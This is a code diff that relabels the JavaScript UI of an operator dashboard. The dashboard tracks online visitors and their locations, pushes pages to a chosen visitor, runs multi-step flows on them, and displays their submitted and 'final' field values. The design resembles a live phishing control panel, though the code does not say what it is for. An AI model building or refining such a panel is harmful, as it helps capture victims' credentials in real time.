+          ? `<span class="chip ${isLpv?'c':'g'}">${isLpv?'Live page':'Remote browser'}</span>
+             <span class="chip ${c.is_sleeping?'a':'g'}">${c.is_sleeping?'Idle':'Active'}</span>
              ${c.browser ? `<span class="chip m">${esc(c.browser)}</span>` : ''}
              ${c.location && c.location.city ? `<span class="chip m">${esc(c.location.city)}, ${esc(c.location.country||'')}</span>` : ''}`
           : `<span class="chip r">Offline</span>`}
@@ -2378,54 +2409,54 @@ function drawerBody(cid, c, p, opts){
     </div>
 
     <div>
-      <label class="field-lab">On right now</label>
+      <label class="field-lab">Currently on</label>
       <div id="drNow" style="font-size:12.5px;color:var(--txt-2);word-break:break-all;line-height:1.45">${esc(currentPageOf(c))}</div>
     </div>
 
     <div>
-      <label class="field-lab">Push an LPV page</label>
+      <label class="field-lab">Send this visitor a page</label>
       <select class="sel" id="drPage" style="margin-bottom:8px">
-        <option value="">— choose a page —</option>
+        <option value="">Choose a page…</option>
         ${pages.map(pg => `<option value="${esc(pg.id)}" ${opts.push===pg.id?'selected':''}>${esc(pg.name)}</option>`).join('')}
       </select>
       <button class="btn primary" id="drPush" style="width:100%">
-        <svg viewBox="0 0 24 24"><path d="M12 19V5M5 12l7-7 7 7"/></svg>Push to client
+        <svg viewBox="0 0 24 24"><path d="M12 19V5M5 12l7-7 7 7"/></svg>Send page
       </button>
-      ${pages.length ? '' : '<div style="font-size:11px;color:var(--txt-3);margin-top:7px">No archived pages yet.</div>'}
+      ${pages.length ? '' : '<div style="font-size:11px;color:var(--txt-3);margin-top:7px">No saved pages yet.</div>'}
     </div>
 
     <div>
-      <label class="field-lab">Run a workflow</label>
+      <label class="field-lab">Start an automated flow</label>
       <select class="sel" id="drWf" style="margin-bottom:8px">
-        <option value="">— choose a workflow —</option>
+        <option value="">Choose a flow…</option>
         ${wfs.map(w => `<option value="${esc(w.id)}" ${opts.run===w.id?'selected':''}>${esc(w.name)} · ${(w.steps||[]).length} steps</option>`).join('')}
       </select>
       <button class="btn" id="drRun" style="width:100%">
-        <svg viewBox="0 0 24 24"><path d="M6 4l14 8-14 8z"/></svg>Start chain
+        <svg viewBox="0 0 24 24"><path d="M6 4l14 8-14 8z"/></svg>Start flow
       </button>
     </div>
 
     <div>
-      <label class="field-lab">LPV session</label>
+      <label class="field-lab">Live session</label>
       <div style="display:flex;gap:6px">
         <button class="btn green" id="drStart" style="flex:1">Start</button>
-        <button class="btn red" id="drStop" style="flex:1">Stop</button>
+        <button class="btn red" id="drStop" style="flex:1">End</button>
       </div>
     </div>
 
     ${p ? `
     <div>
-      <label class="field-lab">Profile</label>
+      <label class="field-lab">History</label>
       <div class="p-stats" style="margin:0">
-        <div class="p-stat"><b>${p.event_count||0}</b><span>Events</span></div>
+        <div class="p-stat"><b>${p.event_count||0}</b><span>Actions</span></div>
         <div class="p-stat"><b>${p.page_count||0}</b><span>Pages</span></div>
-        <div class="p-stat"><b>${p.field_final_count||0}</b><span>Finals</span></div>
+        <div class="p-stat"><b>${p.field_final_count||0}</b><span>Details</span></div>
       </div>
       ${p.last_page_name ? `<div class="p-page" style="margin-top:10px;margin-bottom:0">${esc(p.last_page_name)}</div>` : ''}
     </div>` : ''}
 
     <div>
-      <label class="field-lab">Recent events</label>
+      <label class="field-lab">Recent activity</label>
       <div class="feed" id="drAudit" style="max-height:none"></div>
     </div>
   `;
@@ -2433,8 +2464,8 @@ function drawerBody(cid, c, p, opts){
 function renderPicker(opts){
   $('#drAvatar').textContent = '?';
   $('#drAvatar').className = 'avatar';
-  $('#drTitle').textContent = opts.push ? 'Push page to…' : 'Run workflow on…';
-  $('#drSub').textContent = 'pick a connected client';
+  $('#drTitle').textContent = opts.push ? 'Send page to…' : 'Start flow for…';
+  $('#drSub').textContent = 'pick a visitor who is online';
   const list = S.clients;
   $('#drBody').innerHTML = list.length
     ? `<div style="display:flex;flex-direction:column;gap:8px">
@@ -2443,10 +2474,10 @@ function renderPicker(opts){
             <span class="dot ${c.is_sleeping?'':'on'}"></span>
             <span style="font-family:var(--mono);font-size:12px">${esc(shortId(c.client_id,14))}</span>
             <span style="margin-left:auto;color:var(--txt-3);font-size:11px;font-weight:400">
-              ${esc(c.is_lpv?'LPV':'browser')}</span>
+              ${esc(c.is_lpv?'Live page':'Remote browser')}</span>
           </button>`).join('')}
        </div>`
-    : `<div class="empty" style="padding:34px 16px">No clients are connected right now.</div>`;
+    : `<div class="empty" style="padding:34px 16px">No visitors are online right now.</div>`;
   $$('[data-pick]').forEach(b => b.addEventListener('click', () => {
     const cid = b.dataset.pick;
     openDrawer(cid, opts);
@@ -2457,41 +2488,41 @@ function wireDrawer(cid, opts){
   if(push) push.addEventListener('click', () => {
     const pid = $('#drPage').value;
     if(!pid) return toast('Choose a page first', 'err');
-    if(wsSend({type:'lpv_push_page', client_id: cid, page_id: pid})) toast('Pushing page…', 'info');
+    if(wsSend({type:'lpv_push_page', client_id: cid, page_id: pid})) toast('Sending page…', 'info');
   });
   const run = $('#drRun');
   if(run) run.addEventListener('click', async () => {
     const wid = $('#drWf').value;
-    if(!wid) return toast('Choose a workflow first', 'err');
+    if(!wid) return toast('Choose a flow first', 'err');
     try {
       const r = await post('/api/lpv/workflows/' + encodeURIComponent(wid) + '/run/' + encodeURIComponent(cid), {});
-      toast(`Workflow started · ${r.steps ?? 0} steps`, 'ok');
+      toast(`Flow started · ${r.steps ?? 0} steps`, 'ok');
       setTimeout(()=>loadAudit(cid), 900);
     } catch(e){ toast('Run failed: ' + e.message, 'err'); }
   });
   const st = $('#drStart');
-  if(st) st.addEventListener('click', () => { if(wsSend({type:'lpv_start', client_id: cid})) toast('Starting LPV…','info'); });
+  if(st) st.addEventListener('click', () => { if(wsSend({type:'lpv_start', client_id: cid})) toast('Starting live session…','info'); });
   const sp = $('#drStop');
-  if(sp) sp.addEventListener('click', () => { if(wsSend({type:'lpv_stop', client_id: cid})) toast('Stopping LPV…','info'); });
+  if(sp) sp.addEventListener('click', () => { if(wsSend({type:'lpv_stop', client_id: cid})) toast('Ending live session…','info'); });
 }
 function paintDrawerMeta(c){
   const el = $('#drMeta'); if(!el) return;
   el.innerHTML = `
-    <span class="chip ${c.is_lpv?'c':'g'}">${c.is_lpv?'LPV':'Browser'}</span>
-    <span class="chip ${c.is_sleeping?'a':'g'}">${c.is_sleeping?'Sleeping':'Active'}</span>
+    <span class="chip ${c.is_lpv?'c':'g'}">${c.is_lpv?'Live page':'Remote browser'}</span>
+    <span class="chip ${c.is_sleeping?'a':'g'}">${c.is_sleeping?'Idle':'Active'}</span>
     ${c.browser ? `<span class="chip m">${esc(c.browser)}</span>` : ''}
     ${c.location && c.location.city ? `<span class="chip m">${esc(c.location.city)}, ${esc(c.location.country||'')}</span>` : ''}`;
 }
 function paintAudit(){
   const el = $('#drAudit'); if(!el) return;
   if(!S.audit.length){
-    el.innerHTML = `<div style="text-align:center;padding:22px;color:var(--txt-3);font-size:12px">No events recorded yet.</div>`;
+    el.innerHTML = `<div style="text-align:center;padding:22px;color:var(--txt-3);font-size:12px">No activity recorded yet.</div>`;
     return;
   }
   el.innerHTML = S.audit.map(e => `
     <div class="feed-item">
       <span class="t">${esc(clockTime(e.timestamp))}</span>
-      <span class="chip ${e.event_type.includes('final')?'a':e.event_type.includes('submit')?'g':''}">${esc(e.event_type)}</span>
+      <span class="chip ${e.event_type.includes('final')?'a':e.event_type.includes('submit')?'g':''}">${esc(eventLabel(e.event_type))}</span>
       <span class="pg">${esc(e.page_name || '')}</span>
       ${extractValue(e.payload) ? `<span class="vl" title="${esc(extractValue(e.payload))}">${esc(extractValue(e.payload))}</span>` : ''}
     </div>`).join('');
